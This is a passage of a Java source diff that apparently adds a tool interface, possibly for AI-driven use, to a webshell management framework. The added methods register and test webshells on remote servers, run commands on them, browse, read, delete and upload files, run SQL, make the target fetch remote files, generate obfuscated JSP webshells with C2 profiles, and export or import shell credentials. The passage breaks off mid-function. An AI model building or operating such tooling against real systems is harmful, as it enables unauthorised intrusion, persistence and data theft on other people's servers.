+        if (a.containsKey("proxyPort")) sh.setProxyPort(toInt(a.get("proxyPort"), 8080));
+        if (a.containsKey("connTimeout")) sh.setConnTimeout(toInt(a.get("connTimeout"), 60000));
+        if (a.containsKey("readTimeout")) sh.setReadTimeout(toInt(a.get("readTimeout"), 60000));
+        if (a.containsKey("c2Profile")) sh.setC2ProfileName((String) a.get("c2Profile"));
+        if (a.containsKey("maxRetry")) sh.setMaxErrRetry(toInt(a.get("maxRetry"), 3));
+        if (Db.addShell(sh) > 0) { sh.setGroup("/");
+            return "\u6dfb\u52a0\u6210\u529f! Shell ID: " + sh.getId();
+        }
+        return "\u6dfb\u52a0\u5931\u8d25";
+    }
+
+    private String shellEdit(Map<String, Object> a) {
+        ShellEntity sh = getShell(a);
+        if (a.containsKey("url")) sh.setUrl((String) a.get("url"));
+        if (a.containsKey("password")) sh.setPassword((String) a.get("password"));
+        if (a.containsKey("secretKey")) sh.setSecretKey((String) a.get("secretKey"));
+        if (a.containsKey("payload")) sh.setPayload((String) a.get("payload"));
+        if (a.containsKey("cryption")) sh.setCryption((String) a.get("cryption"));
+        if (a.containsKey("encoding")) sh.setEncoding((String) a.get("encoding"));
+        if (a.containsKey("remark")) sh.setRemark((String) a.get("remark"));
+        if (a.containsKey("headers")) sh.setHeader((String) a.get("headers"));
+        if (a.containsKey("proxyType")) sh.setProxyType((String) a.get("proxyType"));
+        if (a.containsKey("proxyHost")) sh.setProxyHost((String) a.get("proxyHost"));
+        if (a.containsKey("proxyPort")) sh.setProxyPort(toInt(a.get("proxyPort"), 8080));
+        if (a.containsKey("connTimeout")) sh.setConnTimeout(toInt(a.get("connTimeout"), 60000));
+        if (a.containsKey("readTimeout")) sh.setReadTimeout(toInt(a.get("readTimeout"), 60000));
+        if (a.containsKey("reqLeft")) sh.setReqLeft((String) a.get("reqLeft"));
+        if (a.containsKey("reqRight")) sh.setReqRight((String) a.get("reqRight"));
+        if (a.containsKey("c2Profile")) sh.setC2ProfileName((String) a.get("c2Profile"));
+        return Db.updateShell(sh) > 0 ? "\u7f16\u8f91\u6210\u529f" : "\u7f16\u8f91\u5931\u8d25";
+    }
+
+    private String shellClone(Map<String, Object> a) {
+        ShellEntity src = getShell(a);
+        ShellEntity clone = new ShellEntity();
+        clone.setId(UUID.randomUUID().toString());
+        clone.setUrl(a.containsKey("newUrl") ? (String)a.get("newUrl") : src.getUrl());
+        clone.setPassword(src.getPassword()); clone.setSecretKey(src.getSecretKey());
+        clone.setPayload(src.getPayload()); clone.setCryption(src.getCryption());
+        clone.setEncoding(src.getEncoding());
+        if (src.getRemark() != null) clone.setRemark(src.getRemark() + " (clone)");
+        if (Db.addShell(clone) > 0) return "\u514b\u9686\u6210\u529f! \u65b0 Shell ID: " + clone.getId() + " URL: " + clone.getUrl();
+        return "\u514b\u9686\u5931\u8d25";
+    }
+
+    private String shellBatchTest(Map<String, Object> a) {
+        String group = (String) a.getOrDefault("group", "/");
+        Vector<Vector<String>> rows = "/".equals(group) ? Db.getAllShell() : Db.getAllShell(group);
+        if (rows.size() <= 1) return "\u65e0 Shell \u53ef\u6d4b\u8bd5";
+        rows.remove(0);
+        StringBuilder sb = new StringBuilder(); int ok = 0, fail = 0;
+        for (Vector<String> row : rows) {
+            String sid = row.get(0);
+            String url = row.size()>1 ? row.get(1) : "";
+            // Try from cache first
+            ShellEntity cached = shellCache.get(sid);
+            if (cached != null && cached.getPayloadModule() != null) {
+                try {
+                    cached.getPayloadModule().getBasicsInfo();
+                    sb.append("[OK-\u7f13\u5b58] ").append(sid).append(" ").append(url).append("\n");
+                    ok++; continue;
+                } catch (Exception e) { shellCache.remove(sid); }
+            }
+            try {
+                ShellEntity sh = Db.getOneShell(sid);
+                boolean alive = sh.initShellOpertion();
+                if (alive) { shellCache.put(sid, sh); }
+                sb.append(alive ? "[OK] " : "[FAIL] ").append(sid).append(" ").append(url).append("\n");
+                if (alive) ok++; else fail++;
+            } catch (Exception ex) { sb.append("[ERR] ").append(sid).append(" ").append(ex.getMessage()).append("\n"); fail++; }
+        }
+        return "\u6279\u91cf\u6d4b\u8bd5: " + ok + " \u6210\u529f, " + fail + " \u5931\u8d25\n" + sb.toString();
+    }
+
+    private String shellDelete(Map<String, Object> a) {
+        String sid = (String) a.get("shellId");
+        if (Db.removeShell(sid) > 0) {
+            closeShell(sid);
+            return "\u5220\u9664\u6210\u529f";
+        }
+        return "\u5220\u9664\u5931\u8d25";
+    }
+
+    // --- System Info ---
+    private String shellInfo(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        String info = pl.getBasicsInfo();
+        
+        return info;
+    }
+
+    private String shellTest(Map<String, Object> a) {
+        // Try cache first, fall back to fresh init
+        String sid = (String) a.get("shellId");
+        ShellEntity cached = shellCache.get(sid);
+        if (cached != null && cached.getPayloadModule() != null) {
+            try {
+                String info = cached.getPayloadModule().getBasicsInfo();
+                return "\u8fde\u63a5\u6b63\u5e38(\u7f13\u5b58) | " + (info != null ? info.split("\n")[0] : "");
+            } catch (Exception e) { shellCache.remove(sid); }
+        }
+        return getShell(a).initShellOpertion() ? "\u8fde\u63a5\u6d4b\u8bd5\u6210\u529f" : "\u8fde\u63a5\u6d4b\u8bd5\u5931\u8d25";
+    }
+
+    private String processList(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a); Payload pl = sh.getPayloadModule();
+        String cmd = pl.getOsInfo().toLowerCase().contains("win") ? "tasklist" : "ps aux";
+        String r = pl.execCommand(cmd); 
+        return r;
+    }
+
+    private String fileSearch(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a); Payload pl = sh.getPayloadModule();
+        String pattern = (String) a.get("pattern");
+        if (pattern == null || pattern.isEmpty()) return "\u8bf7\u63d0\u4f9b pattern \u53c2\u6570";
+        String path = (String) a.getOrDefault("path", pl.currentDir());
+        String normPat = pattern.replace("*", "").toLowerCase();
+        StringBuilder sb = new StringBuilder();
+        int found = 0;
+        // Recursive search via getFile()
+        java.util.LinkedList<String> dirs = new java.util.LinkedList<>();
+        dirs.add(path);
+        int scanned = 0;
+        while (!dirs.isEmpty() && scanned < 2000) {
+            String dir = dirs.poll();
+            try {
+                core.shell.GFile[] files = pl.getFile(dir);
+                if (files == null) continue;
+                for (core.shell.GFile f : files) {
+                    scanned++;
+                    if (f.isDirectory()) { dirs.add(f.getAbsolutePath()); continue; }
+                    if (f.getName().toLowerCase().contains(normPat)) {
+                        sb.append(f.getAbsolutePath()).append(" (").append(f.length()).append(" bytes)\n");
+                        found++;
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+        return found > 0 ? "\u627e\u5230 " + found + " \u4e2a\u6587\u4ef6:\n" + sb.toString() : "\u672a\u627e\u5230\u5339\u914d " + pattern + " \u7684\u6587\u4ef6";
+    }
+
+    private String netInfo(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a); Payload pl = sh.getPayloadModule();
+        boolean isWin = pl.getOsInfo().toLowerCase().contains("win");
+        String cmd = isWin ? "netstat -ano" : "netstat -tlnp 2>/dev/null || ss -tlnp";
+        String r = pl.execCommand(cmd); 
+        return r;
+    }
+
+    // --- Command ---
+    private String shellExec(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        String command = (String) a.get("command");
+        String osHint = (String) a.get("os"); // optional override: "win" or "linux"
+        if (osHint == null) osHint = pl.getOsInfo();
+        boolean isWin = osHint != null && osHint.toLowerCase().contains("win");
+        // Wrap multi-line commands
+        if (isWin && !command.toLowerCase().startsWith("cmd") && command.contains("\n")) {
+            command = "cmd /c " + command.replace("\n", " & ");
+        }
+        String result = pl.execCommand(command);
+        if (result == null || result.isEmpty()) return "(无输出)";
+        return result;
+    }
+
+    // --- File Operations ---
+    private String fileList(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        String path = (String) a.get("path");
+        if (path == null || path.isEmpty()) path = pl.currentDir();
+        try {
+            core.shell.GFile[] files = pl.getFile(path);
+            if (files == null || files.length == 0) return "目录为空: " + path;
+            StringBuilder sb = new StringBuilder("目录: " + path + "\n");
+            for (core.shell.GFile f : files) {
+                sb.append(f.isDirectory() ? "D " : "F ");
+                sb.append(String.format("%-12s", f.isDirectory() ? "" : String.valueOf(f.length())));
+                sb.append("  ").append(f.lastModifiedStr());
+                sb.append("  ").append(f.getName()).append("\n");
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "列目录失败: " + e.getMessage();
+        }
+    }
+
+    private String fileRead(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        String path = (String) a.get("path");
+        // Check file size first to avoid loading huge files into AI context
+        long size = pl.getFileSize(path);
+        if (size > 512 * 1024) {
+            return "文件过大(" + size + " bytes)，请用 file_download_local 下载到本地再查看";
+        }
+        byte[] data = pl.downloadFile(path);
+        if (data == null || data.length == 0) return "文件为空或不存在";
+        try { return new String(data, StandardCharsets.UTF_8); }
+        catch (Exception e) { return "[Binary] 请用 file_download_local 下载"; }
+    }
+
+    private String fileDelete(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        boolean ok = pl.deleteFile((String) a.get("path"));
+        
+        return ok ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
+    }
+
+    private String fileCopy(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        boolean ok = pl.copyFile((String) a.get("src"), (String) a.get("dest"));
+        
+        return ok ? "\u590d\u5236\u6210\u529f" : "\u590d\u5236\u5931\u8d25";
+    }
+
+    private String fileMove(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        boolean ok = pl.moveFile((String) a.get("src"), (String) a.get("dest"));
+        
+        return ok ? "\u79fb\u52a8\u6210\u529f" : "\u79fb\u52a8\u5931\u8d25";
+    }
+
+    private String fileMkdir(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        boolean ok = pl.newDir((String) a.get("path"));
+        
+        return ok ? "\u521b\u5efa\u6210\u529f" : "\u521b\u5efa\u5931\u8d25";
+    }
+
+    private String fileAttr(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        boolean ok = pl.setFileAttr((String) a.get("path"), (String) a.get("type"), (String) a.get("attr"));
+        
+        return ok ? "\u8bbe\u7f6e\u6210\u529f" : "\u8bbe\u7f6e\u5931\u8d25";
+    }
+
+    private String fileRemoteDown(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        boolean ok = pl.fileRemoteDown((String) a.get("url"), (String) a.get("savePath"));
+        
+        return ok ? "\u4e0b\u8f7d\u6210\u529f" : "\u4e0b\u8f7d\u5931\u8d25";
+    }
+
+    private String fileRoots(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        String[] roots = pl.listFileRoot();
+        
+        StringBuilder sb = new StringBuilder();
+        for (String r : roots) sb.append(r).append("\n");
+        return sb.toString();
+    }
+
+    // --- Upload local file directly (server reads, auto-chunks) ---
+    private String fileUploadLocal(Map<String, Object> a) {
+        String localPath = (String) a.get("localPath");
+        String remotePath = (String) a.get("remotePath");
+        if (localPath == null || remotePath == null) return "缺少 localPath 或 remotePath";
+        java.io.File f = new java.io.File(localPath);
+        if (!f.exists()) return "本地文件不存在: " + localPath;
+        try {
+            ShellEntity sh = getShellInit(a);
+            Payload pl = sh.getPayloadModule();
+            byte[] data = java.nio.file.Files.readAllBytes(f.toPath());
+            long size = f.length();
+            if (size > 1048576) {
+                int chunkSize = sh.getOnceBigFileUploadByteNum();
+                if (chunkSize <= 0) chunkSize = 1048576;
+                long pos = 0;
+                while (pos < size) {
+                    int len = (int) Math.min(chunkSize, size - pos);
+                    byte[] chunk = new byte[len];
+                    System.arraycopy(data, (int) pos, chunk, 0, len);
+                    pl.bigFileUpload(remotePath, pos, chunk);
+                    pos += len;
+                }
+                return "上传成功! " + size + " bytes -> " + remotePath;
+            } else {
+                boolean ok = pl.uploadFile(remotePath, data);
+                return ok ? "上传成功! " + size + " bytes -> " + remotePath : "上传失败";
+            }
+        } catch (Exception ex) { return "上传失败: " + ex.getMessage(); }
+    }
+
+    // --- Download remote file directly to local (server writes) ---
+    private String fileDownloadLocal(Map<String, Object> a) {
+        String remotePath = (String) a.get("remotePath");
+        String localPath = (String) a.get("localPath");
+        if (remotePath == null || localPath == null) return "缺少 remotePath 或 localPath";
+        try {
+            ShellEntity sh = getShellInit(a);
+            Payload pl = sh.getPayloadModule();
+            // Try small file first
+            byte[] data = pl.downloadFile(remotePath);
+            if (data == null || data.length == 0) return "下载失败: 远程文件为空或不存在";
+            java.nio.file.Files.write(java.nio.file.Paths.get(localPath), data);
+            return "下载成功! " + data.length + " bytes -> " + localPath;
+        } catch (Exception ex) { return "下载失败: " + ex.getMessage(); }
+    }
+
+
+    // --- Database ---
+    private String dbExec(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        DbInfo dbInfo = null;
+        // Support configName to use saved db config directly
+        String configName = (String) a.get("configName");
+        if (configName != null && !configName.isEmpty()) {
+            dbInfo = sh.getDbInfo(configName);
+            if (dbInfo == null) return "未找到数据库配置: " + configName + "，用 db_configs(action=list) 查看已保存配置";
+        }
+        if (dbInfo == null) {
+            dbInfo = new DbInfo();
+            dbInfo.setDatabaseType((String) a.get("dbType"));
+            dbInfo.setHost((String) a.get("dbHost"));
+            dbInfo.setPort(toInt(a.get("dbPort"), 3306));
+            dbInfo.setCurrentDatabase((String) a.get("dbName"));
+            dbInfo.setUsername((String) a.get("dbUser"));
+            dbInfo.setPassword((String) a.get("dbPass"));
+        }
+        String execType = (String) a.getOrDefault("execType", "select");
+        Object result = pl.execSql(dbInfo, execType, (String) a.get("sql"));
+        return result != null ? result.toString() : "null";
+    }
+
+    private String dbListTypes(Map<String, Object> a) {
+        ShellEntity sh = getShellInit(a);
+        Payload pl = sh.getPayloadModule();
+        String[] types = pl.getSupportDatabaseTypes();
+        
+        return String.join(", ", types);
+    }
+
+    @SuppressWarnings("unchecked")
+    private String dbConfigs(Map<String, Object> a) {
+        ShellEntity sh = getShell(a);
+        String action = (String) a.getOrDefault("action", "list");
+        switch (action) {
+            case "list": { String[] configs = sh.listDatabaseConfigs(); return configs.length>0 ? String.join("\n", configs) : "\u65e0\u6570\u636e\u5e93\u914d\u7f6e"; }
+            case "get": { DbInfo info = sh.getDbInfo((String) a.get("configName")); return info != null ? new Yaml().dump(info) : "\u672a\u627e\u5230"; }
+            case "add": case "update": {
+                Object dbInfoObj = a.get("dbInfo");
+                DbInfo info;
+                if (dbInfoObj instanceof Map) info = new Yaml().loadAs(new Yaml().dump(dbInfoObj), DbInfo.class);
+                else info = new Yaml().loadAs((String) dbInfoObj, DbInfo.class);
+                boolean ok = action.equals("add") ? sh.addDbIfo(info) : sh.updateDbIfo(info);
+                return ok ? "\u6210\u529f" : "\u5931\u8d25";
+            }
+            case "delete": return sh.deleteDbInfo((String) a.get("configName")) ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
+            default: return "\u672a\u77e5\u64cd\u4f5c: " + action;
+        }
+    }
+
+    // --- Payloads ---
+    private String payloadList() {
+        StringBuilder sb = new StringBuilder();
+        for (String pn : ApplicationContext.getAllPayload()) {
+            sb.append("Payload: ").append(pn).append("\n");
+            for (String cn : ApplicationContext.getAllCryption(pn)) {
+                sb.append("  Cryption: ").append(cn).append("\n");
+            }
+        }
+        return sb.toString();
+    }
+
+    // --- C2 Profile ---
+    private String c2profileList(Map<String, Object> a) {
+        String payload = (String) a.get("payload");
+        String[] profiles = payload != null ? ApplicationContext.listC2Profile(payload) : ApplicationContext.listC2Profile();
+        return profiles.length > 0 ? String.join("\n", profiles) : "\u65e0 C2 \u914d\u7f6e";
+    }
+
+    private String c2profileGet(Map<String, Object> a) {
+        String content = ApplicationContext.getC2Profile((String) a.get("name"));
+        return content != null ? content : "\u672a\u627e\u5230";
+    }
+
+    // --- Shell Env ---
+    private String shellEnv(Map<String, Object> a) {
+        ShellEntity sh = getShell(a);
+        String action = (String) a.getOrDefault("action", "get");
+        String key = (String) a.get("key");
+        switch (action) {
+            case "get": return sh.getEnv(key, "");
+            case "set": return sh.setEnv(key, (String) a.get("value")) ? "\u8bbe\u7f6e\u6210\u529f" : "\u8bbe\u7f6e\u5931\u8d25";
+            case "del": return sh.removeEnv(key) ? "\u5220\u9664\u6210\u529f" : "\u5220\u9664\u5931\u8d25";
+            case "list": return "ERR_RETRY_NUM, onceBigFileDownloadByteNum, onceBigFileUploadByteNum, bigFileDownloadThreadNum, mergeResponseCookie, clientCertPath, clientCertPassword, c2Profile, ENV_GROUP_ID, DatabaseConfig_*";
+            default: return "\u672a\u77e5\u64cd\u4f5c: " + action;
+        }
+    }
+
+    // Fuzzy match cryption name (case-insensitive, ignore _ - space)
+    private String resolveCryption(String payload, String input) {
+        String norm = input.toLowerCase().replaceAll("[_\\-\\s]", "");
+        for (String cn : ApplicationContext.getAllCryption(payload)) {
+            if (cn.toLowerCase().replaceAll("[_\\-\\s]", "").equals(norm)) return cn;
+        }
+        for (String cn : ApplicationContext.getAllCryption(payload)) {
+            if (cn.toLowerCase().replaceAll("[_\\-\\s]", "").contains(norm) ||
+                norm.contains(cn.toLowerCase().replaceAll("[_\\-\\s]", ""))) return cn;
+        }
+        return null;
+    }
+
+    // --- One-step Create Shell + Generate File ---
+    private String shellCreate(Map<String, Object> a) {
+        String url = (String) a.getOrDefault("url", "http://127.0.0.1:8080/shell.jsp");
+        String password = (String) a.getOrDefault("password", "pass");
+        String secretKey = (String) a.getOrDefault("secretKey", "key");
+        String payloadRaw = (String) a.getOrDefault("payload", "JavaDynamicPayload");
+        // Fuzzy match payload name
+        String payload = null;
+        String normPl = payloadRaw.toLowerCase().replaceAll("[_\\-\\s]", "");
+        for (String pn : ApplicationContext.getAllPayload()) {
+            if (pn.toLowerCase().replaceAll("[_\\-\\s]", "").equals(normPl)) { payload = pn; break; }
+        }
+        if (payload == null) {
+            for (String pn : ApplicationContext.getAllPayload()) {
+                if (pn.toLowerCase().replaceAll("[_\\-\\s]", "").contains(normPl)) { payload = pn; break; }
+            }
+        }
+        if (payload == null) payload = "JavaDynamicPayload";
+        String cryptionRaw = (String) a.get("cryption");
+        String genFile = (String) a.get("genFile");
+        String obfLevel = (String) a.getOrDefault("obfuscation", "default");
+        if (cryptionRaw == null || genFile == null)
+            return "缺少必填参数。必填: cryption, genFile";
+        if (!"default".equals(obfLevel)) { Db.updateSetingKV("godMode", obfLevel); }
+        // Fuzzy match cryption name (user may say aesbase64/java_c2/gzip etc.)
+        String cryption = resolveCryption(payload, cryptionRaw);
+        if (cryption == null) {
+            StringBuilder avail = new StringBuilder("未找到加密器: " + cryptionRaw + "\n可用加密器:\n");
+            for (String cn : ApplicationContext.getAllCryption(payload)) avail.append("  ").append(cn).append("\n");
+            return avail.toString();
+        }
+        // Build ShellEntity
+        ShellEntity sh = new ShellEntity();
+        sh.setId(UUID.randomUUID().toString());
+        sh.setUrl(url); sh.setPassword(password); sh.setSecretKey(secretKey);
+        sh.setPayload(payload); sh.setCryption(cryption);
+        sh.setEncoding("UTF-8");
+        try {
+            Object cryptionObj = ApplicationContext.getCryption(payload, cryption);
+            if (cryptionObj == null) return "未找到加密器: " + cryption;
+            // Detect if this is a C2 cryption (has 3-arg generate with C2ProfileContext)
+            boolean isC2 = false;
+            try { cryptionObj.getClass().getMethod("generate", String.class, String.class, C2ProfileContext.class); isC2 = true; } catch (NoSuchMethodException e) {}
+            String c2Profile = null;
+            if (isC2) {
+                c2Profile = (String) a.get("c2Profile");
+                if (c2Profile == null || c2Profile.isEmpty()) {
+                    String[] allProfiles = ApplicationContext.listC2Profile(payload);
+                    if (allProfiles.length > 0) c2Profile = allProfiles[0];
+                }
+            }
+            byte[] shellBytes;
+            if (isC2 && c2Profile != null && !c2Profile.isEmpty()) {
+                // C2 cryption: bypass 3-arg generate() which has hardcoded UI dialogs.
+                // Instead directly load template and call generate() ourselves.
+                Object ctx = C2ProfileLoader.loadC2Profile(c2Profile); // 1-arg version
+                Object c2ProfileCtx = ctx.getClass().getMethod("getC2ProfileContext").invoke(ctx);
+                java.lang.reflect.Method listTpl = C2ProfileContext.class.getMethod("listC2ProfileTemplate", String.class);
+                java.util.LinkedList<?> templates = (java.util.LinkedList<?>) listTpl.invoke(c2ProfileCtx, payload);
+                if (templates.isEmpty()) return "C2Profile 中没有可用模板";
+                // Pick first template, use "jsp" suffix
+                Class<?> tplClass = (Class<?>) templates.get(0);
+                java.lang.reflect.Constructor<?> ctor = tplClass.getConstructor(C2ProfileContext.class, String.class, String.class, java.util.HashMap.class);
+                Object template = ctor.newInstance(c2ProfileCtx, payload, "jsp", new java.util.HashMap<>());
+                shellBytes = (byte[]) template.getClass().getMethod("generate").invoke(template);
+                // Apply template preprocessor (e.g. jsp -> escape special chars)
+                shellBytes = core.shellprocessor.StartProcessor.process(shellBytes, "jsp");
+            } else {
+                // Non-C2 cryption: set suffix field directly (skip init to avoid connection), then generate()
+                try {
+                    java.lang.reflect.Field sf = cryptionObj.getClass().getDeclaredField("suffix");
+                    sf.setAccessible(true);
+                    String curSuffix = (String) sf.get(cryptionObj);
+                    if (curSuffix == null || curSuffix.isEmpty()) { sf.set(cryptionObj, "jsp"); }
+                } catch (Exception ign) {}
+                java.lang.reflect.Method gen2 = cryptionObj.getClass().getMethod("generate", String.class, String.class);
+                shellBytes = (byte[]) gen2.invoke(cryptionObj, password, secretKey);
+            }
+            if (shellBytes == null || shellBytes.length == 0) return "生成失败: 空文件";
+            java.nio.file.Files.write(java.nio.file.Paths.get(genFile), shellBytes);
+            return "生成成功! 文件: " + genFile + " (" + shellBytes.length + " bytes)"
+                + " | URL: " + url + " | Payload: " + payload + " | Cryption: " + cryption
+                + " | Obfuscation: " + obfLevel + " | C2Profile: " + (c2Profile != null ? c2Profile : "无");
+        } catch (Exception ex) { return "生成失败: " + ex.getMessage(); }
+    }
+
+    // --- Export/Import ---
+    private String shellExport(Map<String, Object> a) {
+        StringBuilder sb = new StringBuilder();
+        if (a.containsKey("shellId")) {
+            ShellEntity sh = Db.getOneShell((String) a.get("shellId"));
+            if (sh == null) return "\u672a\u627e\u5230 Shell";
+            sb.append(serializeShell(sh));
+        } else {
+            Vector<Vector<String>> rows = Db.getAllShell();
+            if (rows.size() > 1) rows.remove(0);
+            for (Vector<String> row : rows) {
+                ShellEntity sh = Db.getOneShell(row.get(0));
+                if (sh != null) sb.append(serializeShell(sh)).append("");
+            }
+        }
+        try {
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            java.util.zip.GZIPOutputStream gzos = new java.util.zip.GZIPOutputStream(bos);
+            gzos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
+            gzos.close();
+            return "gsl5://import?data=" + Base64.getUrlEncoder().withoutPadding().encodeToString(bos.toByteArray());
+        } catch (Exception e) { return "\u5bfc\u51fa\u5931\u8d25: " + e.getMessage(); }
+    }
+
+    private String shellImport(Map<String, Object> a) {
+        String link = (String) a.get("link");
+        if (!link.startsWith("gsl5://import?data=")) return "\u65e0\u6548\u94fe\u63a5";
+        try {
+            byte[] compressed = Base64.getUrlDecoder().decode(link.substring("gsl5://import?data=".length()));
+            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(compressed);
+            java.util.zip.GZIPInputStream gzis = new java.util.zip.GZIPInputStream(bis);
+            byte[] raw = functions.readInputStream(gzis); gzis.close();
+            String data = new String(raw, StandardCharsets.UTF_8);
+            String[] records = data.split("\\u0002", -1);
+            int added = 0;
+            StringBuilder result = new StringBuilder();
+            for (String rec : records) {
+                if (rec.trim().isEmpty()) continue;
+                String[] f = rec.split("\\u0001", -1);
+                if (f.length < 24) continue;
+                ShellEntity sh = new ShellEntity();
+                sh.setId(UUID.randomUUID().toString());
+                sh.setUrl(dec(f[0])); sh.setPassword(dec(f[1])); sh.setSecretKey(dec(f[2]));
+                sh.setPayload(dec(f[3])); sh.setCryption(dec(f[4])); sh.setEncoding(dec(f[5]));
+                sh.setHeader(dec(f[6])); sh.setReqLeft(dec(f[7])); sh.setReqRight(dec(f[8]));
+                try { sh.setConnTimeout(Integer.parseInt(f[9])); } catch (Exception e) {}
+                try { sh.setReadTimeout(Integer.parseInt(f[10])); } catch (Exception e) {}
+                sh.setProxyType(dec(f[11])); sh.setProxyHost(dec(f[12]));
+                try { sh.setProxyPort(Integer.parseInt(f[13])); } catch (Exception e) {}
+                sh.setRemark(dec(f[14])); sh.setC2ProfileName(dec(f[15]));
+                if (Db.addShell(sh) > 0) {
+                    try { sh.setMaxErrRetry(Integer.parseInt(f[16])); } catch (Exception e) {}
+                    try { sh.setOnceBigFileDownloadByteNum(Integer.parseInt(f[17])); } catch (Exception e) {}
+                    try { sh.setOnceBigFileUploadByteNum(Integer.parseInt(f[18])); } catch (Exception e) {}
+                    try { sh.setBigFileDownloadThreadNum(Integer.parseInt(f[19])); } catch (Exception e) {}
+                    try { sh.setMergeResponseCookie(Boolean.parseBoolean(f[20])); } catch (Exception e) {}
+                    sh.setClientCertPath(dec(f[21])); sh.setClientCertPassword(dec(f[22]));
+                    if (f.length>23 && !dec(f[23]).isEmpty()) sh.setGroup(dec(f[23]));
+                    String cp = sh.getC2ProfileName();
+                    if (cp != null && !cp.isEmpty()) sh.setC2ProfileName2(cp);
+                    // Auto-test connection after import
+                    String connStatus = "\u672a\u6d4b\u8bd5";
+                    try {
+                        if (sh.initShellOpertion()) {
+                            connStatus = "\u8fde\u63a5\u6210\u529f";
+                            if (sh.getPayloadModule() != null) {
+                                String info = sh.getPayloadModule().getBasicsInfo();
+                                if (info != null && !info.isEmpty()) {
+                                    connStatus += " | " + info.replace("\n", " | ");
+                                }
+                            }
+                        } else {
+                            connStatus = "\u8fde\u63a5\u5931\u8d25";
+                        }
+                    } catch (Exception ex) { connStatus = "\u8fde\u63a5\u5f02\u5e38: " + ex.getMessage(); }
+                    result.append("Shell ID: ").append(sh.getId())
+                          .append(" | URL: ").append(sh.getUrl())
+                          .append(" | Payload: ").append(sh.getPayload())
+                          .append(" | Status: ").append(connStatus).append("\n");
+                    added++;
+                }
+            }
+            return "\u5bfc\u5165\u5b8c\u6210! \u6210\u529f: " + added + " \u6761\n\n" + result.toString();
+        } catch (Exception e) { return "\u5bfc\u5165\u5931\u8d25: " + e.getMessage(); }
+    }
+
+    // --- Settings ---
+    private String settingsGet(Map<String, Object> a) {
+        if (a.containsKey("key")) {
+            String val = Db.getSetingValue((String) a.get("key"));
+            return val != null ? val : "(null)";
+        }
+        StringBuilder sb = new StringBuilder();
+        for (String k : new String[]{"godMode","shellOpenCache","ui-resourceName","ui-lafClassName",
+            "font-name","font-type","font-size","bigFileErrorRetryNum","FileExtPixel"}) {
+            String v = Db.getSetingValue(k);
+            sb.append(k).append(" = ").append(v != null ? v : "(null)").append("\n");
+        }
+        return sb.toString();
+    }
+
+    private String settingsSet(Map<String, Object> a) {
+        return Db.updateSetingKV((String) a.get("key"), (String) a.get("value")) ? "\u8bbe\u7f6e\u6210\u529f" : "\u8bbe\u7f6e\u5931\u8d25";
+    }
+
+    // ==================== Config File ====================
+    private String configRead(Map<String, Object> a) {
+        try { return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("config.yaml")), StandardCharsets.UTF_8); }
+        catch (Exception e) { return "\u8bfb\u53d6\u5931\u8d25: " + e.getMessage(); }
+    }
+
+    private String configWrite(Map<String, Object> a) {
+        try { java.nio.file.Files.write(java.nio.file.Paths.get("config.yaml"), ((String)a.get("content")).getBytes(StandardCharsets.UTF_8)); return "\u5199\u5165\u6210\u529f"; }
+        catch (Exception e) { return "\u5199\u5165\u5931\u8d25: " + e.getMessage(); }
+    }
+
+    private String oplogQuery(Map<String, Object> a) {
+        int limit = toInt(a.get("limit"), 50);
+        String actionFilter = (String) a.get("action");
+        StringBuilder sb = new StringBuilder();
+        try {
+            java.lang.reflect.Field f = Db.class.getDeclaredField("dbConn");
+            f.setAccessible(true); java.sql.Connection c = (java.sql.Connection) f.get(null);
+            if (c == null) return "\u6570\u636e\u5e93\u672a\u8fde\u63a5";
+            String sql = "SELECT username, shell_id, action, detail, create_time FROM operation_log";
+            if (actionFilter != null && !actionFilter.isEmpty()) sql += " WHERE action LIKE ?";
+            sql += " ORDER BY create_time DESC LIMIT " + Math.min(limit, 500);
+            java.sql.PreparedStatement ps = c.prepareStatement(sql);
+            if (actionFilter != null && !actionFilter.isEmpty()) ps.setString(1, "%" + actionFilter + "%");
+            java.sql.ResultSet rs = ps.executeQuery();
+            while (rs.next()) {
+                sb.append("[").append(rs.getString(5)).append("] ").append(rs.getString(1)).append(" | ").append(rs.getString(3)).append(" | ").append(rs.getString(4)).append("\n");
+            }
+            ps.close();
+        } catch (Exception ex) { return "\u67e5\u8be2\u5931\u8d25: " + ex.getMessage(); }
+        return sb.length() > 0 ? sb.toString() : "\u65e0\u64cd\u4f5c\u65e5\u5fd7";
+    }
+
+    private String shellBackup(Map<String, Object> a) {
+        String genFile = (String) a.getOrDefault("genFile", "shell_backup.txt");
+        try {
+            Vector<Vector<String>> rows = Db.getAllShell();
+            if (rows.size() <= 1) return "\u65e0 Shell \u53ef\u5907\u4efd";
+            rows.remove(0); StringBuilder sb = new StringBuilder();
+            for (Vector<String> row : rows) {
